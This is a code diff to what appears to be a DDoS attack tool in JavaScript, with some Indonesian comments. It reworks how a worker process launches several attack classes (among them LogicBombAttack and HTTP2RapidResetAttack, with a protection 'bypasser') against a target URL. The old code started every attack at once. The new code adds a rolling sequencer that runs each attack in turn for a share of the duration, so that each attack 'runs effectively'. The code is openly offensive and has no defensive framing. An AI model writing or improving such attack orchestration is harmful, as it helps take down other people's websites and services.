@@ -802,25 +802,48 @@ process.on('message', async ({ targetUrl, duration }) => {
     attackers.push(new LogicBombAttack(targetUrl, threads, l7Delay, stats, bypasser, null, discoveredAttackPaths));
     attackers.push(new HTTP2RapidResetAttack(targetUrl, threads, stats, bypasser));
 
-    // Start all attackers
-    try {
-        attackers.forEach(attacker => {
-            if (attacker && attacker.url) { // Check if URL was valid before starting
-                attacker.start();
-            }
-        });
-    } catch (e) {
-        console.error("FATAL: An unexpected error occurred while starting attacks.", e);
+    // --- Rolling Attack Sequencer ---
+    // Runs one attack type at a time to prevent event loop starvation and ensure each attack runs effectively.
+    const validAttackers = attackers.filter(a => a && (a.url || a.sockets)); // Filter out attackers that failed to initialize
+
+    if (validAttackers.length === 0) {
+        console.error("No valid attackers could be initialized. Stopping worker.");
+        if (statsTimeout) clearTimeout(statsTimeout);
+        return;
     }
 
-    // Set a single timeout to stop all attacks after the specified duration
-    setTimeout(() => {
-        attackers.forEach(attacker => {
-            if (attacker) attacker.stop();
-        });
-        // Hentikan loop statistik saat serangan selesai
-        if (statsTimeout) clearTimeout(statsTimeout);
-    }, totalDurationMs);
+    const timePerAttacker = totalDurationMs / validAttackers.length;
+    let currentAttackerIndex = 0;
+
+    const runSequence = async () => {
+        // Stop condition: all attackers have run their course.
+        if (currentAttackerIndex >= validAttackers.length) {
+            console.log("Attack sequence finished.");
+            if (statsTimeout) clearTimeout(statsTimeout);
+            return;
+        }
+
+        const attacker = validAttackers[currentAttackerIndex];
+        stats.phase = attacker.constructor.name; // Update the phase for monitoring
+        console.log(`[${new Date().toISOString()}] Starting attacker: ${stats.phase} for ${Math.round(timePerAttacker / 1000)}s`);
+
+        try {
+            attacker.start();
+        } catch (e) {
+            console.error(`Failed to start ${stats.phase}`, e);
+        }
+
+        // Wait for the allocated time slice for this attacker
+        await new Promise(resolve => setTimeout(resolve, timePerAttacker));
+
+        console.log(`[${new Date().toISOString()}] Stopping attacker: ${stats.phase}`);
+        attacker.stop();
+
+        currentAttackerIndex++;
+        runSequence(); // Schedule the next attacker in the sequence
+    };
+
+    runSequence(); // Start the attack sequence
 
     // Hentikan loop statistik jika proses diputuskan oleh induk
     process.on('disconnect', () => {
